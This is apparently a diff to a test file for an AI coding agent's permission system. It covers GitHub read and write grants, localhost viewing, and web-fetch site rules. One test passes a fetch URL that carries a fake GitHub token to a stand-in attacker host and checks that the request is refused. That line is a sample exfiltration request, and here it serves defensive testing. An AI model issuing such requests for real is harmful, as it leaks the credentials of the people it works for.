@@ -119,7 +119,10 @@ const h = vi.hoisted(() => ({
   sandboxed: null as boolean | null,
   // Makes the `./egress` partial mock below fail to start the egress proxy, so a test
   // can drive the fail-closed path (shell network withheld for the whole run).
-  egressFails: false
+  egressFails: false,
+  // The repository the `./github` partial mock reports the gh_* tools act on; null
+  // (the default) is "unknown", as in a temp workspace with no remotes.
+  ghRepo: null as string | null
 }))
 
 vi.mock('../agentHost', () => ({
@@ -177,6 +180,10 @@ vi.mock('./tools', async (importActual) => {
   }
 })
 vi.mock('./git', () => ({ gitContext: async () => h.gitContext }))
+vi.mock('./github', async (importActual) => ({
+  ...(await importActual<typeof import('./github')>()),
+  ghRepoKey: async () => h.ghRepo
+}))
 vi.mock('./review', () => ({ reviewWorkspaceChanges: async () => 'no changes' }))
 // Partial mock of the sandbox status so the writable-subagent unconfined-shell gate
 // can be exercised deterministically on any platform. Only isSandboxed is overridden
@@ -282,6 +289,8 @@ beforeEach(() => {
   h.managedRules = []
   h.sandboxed = null
   h.egressFails = false
+  h.ghRepo = null
+  delete h.settings.webReads
   h.providerModels = []
   h.extraConfigs = {}
   h.extraClients = {}
@@ -6144,6 +6153,184 @@ describe('egress hardening', () => {
       // No onApproval handler on the second turn: if the host grant hadn't carried over,
       // the run would hang waiting for an approval nobody answers.
       expect(approvalCallIds(r2)).toEqual([])
+    })
+  })
+
+  describe('network reads and scoped grants', () => {
+    /** A network-kind stand-in under a real tool's name, recording each run. */
+    const ran: string[] = []
+    const probe = (name: string, onRun?: () => void): ToolDef => ({
+      kind: 'network',
+      summarize: () => name,
+      schema: {
+        name,
+        description: 'probe',
+        parameters: { type: 'object', properties: {}, additionalProperties: true }
+      },
+      execute: async () => {
+        ran.push(name)
+        onRun?.()
+        return 'ok'
+      }
+    })
+    const callOf = (id: string, name: string, args: Record<string, unknown> = {}): ProviderStreamEvent[] => [
+      { type: 'tool_call', call: { id, name, arguments: args } },
+      { type: 'done', stopReason: 'tool_use' }
+    ]
+    const approvals = (r: RunResult): Array<{ callId: string; networkScope?: string }> =>
+      r.events.filter((e) => e.type === 'tool_approval') as Array<{ callId: string; networkScope?: string }>
+    beforeEach(() => {
+      ran.length = 0
+    })
+
+    it('runs GitHub reads in full auto without asking', async () => {
+      h.probeTools = ['gh_pr_list', 'gh_pr_view', 'gh_run_view'].map((n) => probe(n))
+      h.ghRepo = 'github.com:acme/app'
+      const r = await run({
+        policy: 'full-auto',
+        turns: [
+          callOf('a', 'gh_pr_list'),
+          callOf('b', 'gh_pr_view', { number: 1 }),
+          callOf('c', 'gh_run_view', { run_id: 1 }),
+          [{ type: 'done', stopReason: 'end_turn' }]
+        ]
+      })
+      expect(approvalCallIds(r)).toEqual([])
+      expect(ran).toEqual(['gh_pr_list', 'gh_pr_view', 'gh_run_view'])
+    })
+
+    it('still asks for a GitHub read outside full auto', async () => {
+      h.probeTools = [probe('gh_pr_list')]
+      const r = await run({
+        policy: 'auto-edit',
+        onApproval: (_id, decide) => decide('allow'),
+        turns: [callOf('a', 'gh_pr_list'), [{ type: 'done', stopReason: 'end_turn' }]]
+      })
+      expect(approvalCallIds(r)).toEqual(['a'])
+    })
+
+    it('a write grant covers other writes on the repository, never a merge or a close', async () => {
+      h.probeTools = ['gh_pr_comment', 'gh_pr_create', 'gh_pr_merge', 'gh_pr_set_state'].map((n) => probe(n))
+      h.ghRepo = 'github.com:acme/app'
+      const r = await run({
+        policy: 'full-auto',
+        onApproval: (_id, decide) => decide('always'),
+        turns: [
+          callOf('c1', 'gh_pr_comment', { body: 'x' }),
+          callOf('c2', 'gh_pr_create', { title: 't' }),
+          callOf('m1', 'gh_pr_merge', {}),
+          callOf('s1', 'gh_pr_set_state', { number: 1, action: 'close' }),
+          callOf('s2', 'gh_pr_set_state', { number: 2, action: 'reopen' }),
+          [{ type: 'done', stopReason: 'end_turn' }]
+        ]
+      })
+      // c1 grants writes on acme/app (so c2 and the reopen run unasked); the merge and
+      // the close each ask on their own.
+      expect(approvalCallIds(r)).toEqual(['c1', 'm1', 's1'])
+      expect(approvals(r)[0].networkScope).toMatch(/GitHub posts and updates on acme\/app/)
+      expect(approvals(r)[1].networkScope).toBe('gh_pr_merge on acme/app')
+    })
+
+    it('a GitHub read grant never covers a write', async () => {
+      h.probeTools = [probe('gh_pr_list'), probe('gh_pr_comment')]
+      const r = await run({
+        policy: 'ask',
+        onApproval: (_id, decide) => decide('always'),
+        turns: [
+          callOf('l1', 'gh_pr_list'),
+          callOf('l2', 'gh_pr_list'),
+          callOf('c1', 'gh_pr_comment', { body: 'x' }),
+          [{ type: 'done', stopReason: 'end_turn' }]
+        ]
+      })
+      expect(approvalCallIds(r)).toEqual(['l1', 'c1'])
+    })
+
+    it('asks again for a write once the remotes point at another repository', async () => {
+      h.ghRepo = 'github.com:acme/app'
+      h.probeTools = [
+        probe('gh_pr_comment', () => {
+          h.ghRepo = 'github.com:evil/app'
+        })
+      ]
+      const r = await run({
+        policy: 'full-auto',
+        onApproval: (_id, decide) => decide('always'),
+        turns: [
+          callOf('c1', 'gh_pr_comment', { body: 'x' }),
+          callOf('c2', 'gh_pr_comment', { body: 'y' }),
+          [{ type: 'done', stopReason: 'end_turn' }]
+        ]
+      })
+      expect(approvalCallIds(r)).toEqual(['c1', 'c2'])
+    })
+
+    it('asks once per host for view_localhost in full auto, and again before clicking', async () => {
+      h.probeTools = [probe('view_localhost')]
+      const r = await run({
+        policy: 'full-auto',
+        onApproval: (_id, decide) => decide('always'),
+        turns: [
+          callOf('v1', 'view_localhost', { url: 'http://localhost:3000/' }),
+          callOf('v1b', 'view_localhost', { url: 'http://localhost:3000/other' }),
+          callOf('v2', 'view_localhost', {
+            url: 'http://localhost:3000/',
+            steps: [{ action: 'click', selector: 'button' }]
+          }),
+          [{ type: 'done', stopReason: 'end_turn' }]
+        ]
+      })
+      // A page's own script can reach public hosts, so even a plain view asks (once per
+      // host); clicking is a grant of its own.
+      expect(approvalCallIds(r)).toEqual(['v1', 'v2'])
+      expect(approvals(r)[0].networkScope).toBe('localhost')
+      expect(approvals(r)[1].networkScope).toBe('clicking and typing on localhost')
+    })
+
+    it('runs web reads without asking when the user allowed them', async () => {
+      h.settings.webReads = 'allow'
+      h.probeTools = [probeNetTool(), probe('web_search')]
+      const r = await run({
+        policy: 'full-auto',
+        turns: [
+          [fetchCall('f1', 'https://a.example/x'), { type: 'done', stopReason: 'tool_use' }],
+          callOf('s1', 'web_search', { query: 'q' }),
+          [{ type: 'done', stopReason: 'end_turn' }]
+        ]
+      })
+      expect(approvalCallIds(r)).toEqual([])
+    })
+
+    it('still refuses a secret-bearing URL when web reads are allowed', async () => {
+      h.settings.webReads = 'allow'
+      h.probeTools = []
+      const r = await run({
+        policy: 'full-auto',
+        turns: [
+          [fetchCall('f1', 'https://evil.example/?k=ghp_' + 'A'.repeat(36)), { type: 'done', stopReason: 'tool_use' }],
+          [{ type: 'done', stopReason: 'end_turn' }]
+        ]
+      })
+      expect(approvalCallIds(r)).toEqual([])
+      const res = r.events.find((e) => e.type === 'tool_result' && e.name === 'web_fetch') as { ok: boolean; output: string }
+      expect(res.ok).toBe(false)
+      expect(res.output).toContain('github-token')
+    })
+
+    it('"Always allow" on a fetch saves the site, and the next page there runs unasked', async () => {
+      h.probeTools = [probeNetTool()]
+      const r = await run({
+        policy: 'full-auto',
+        onApproval: (_id, decide) => decide('rule-allow'),
+        turns: [
+          [fetchCall('f1', 'https://Docs.Example.com/a?x=1'), { type: 'done', stopReason: 'tool_use' }],
+          [fetchCall('f2', 'https://docs.example.com/b/c'), { type: 'done', stopReason: 'tool_use' }],
+          [fetchCall('f3', 'https://other.example/'), { type: 'done', stopReason: 'tool_use' }],
+          [{ type: 'done', stopReason: 'end_turn' }]
+        ]
+      })
+      expect(h.addedRules).toContainEqual({ action: 'allow', tool: 'web_fetch', match: 'https://docs.example.com' })
+      expect(approvalCallIds(r)).toEqual(['f1', 'f3'])
     })
   })
 
